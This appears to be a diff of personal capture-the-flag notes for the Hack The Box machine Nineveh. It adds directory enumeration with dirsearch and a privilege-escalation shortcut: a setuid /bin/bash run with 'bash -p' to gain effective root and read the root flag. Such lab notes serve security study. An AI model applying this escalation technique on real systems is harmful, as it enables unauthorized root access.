@@ -1,11 +1,5 @@
 //port 53, 80 open
 
-
-
-
-
-
-
 sudo dirsearch -u http://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 [11:24:19] 301 -  315B  - /department  ->  http://10.10.10.43/department/  //for http
 
@@ -282,3 +276,19 @@ test.txt
 vulnScan.sh
 root@nineveh:~# cat root.txt
 cat root.txt
+
+
+//or grant bash file +s pirvi, then bash -p
+amrois@nineveh:/tmp$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
+amrois@nineveh:/tmp$ bash -p
+bash-4.3# ls
+a.out  lin.txt	   systemd-private-b39f9d0a8591427f8f8fdb9affb0b994-systemd-timesyncd.service-a67e2I  vmware-root
+b.out  linpeas.sh  tmux-33
+f      pspy64	   update
+bash-4.3# id
+uid=1000(amrois) gid=1000(amrois) euid=0(root) egid=0(root) groups=0(root),1000(amrois)
+bash-4.3# cat root.txt
+cat: root.txt: No such file or directory
+bash-4.3# cat /root/root.txt
+09db3629aea730f1dd
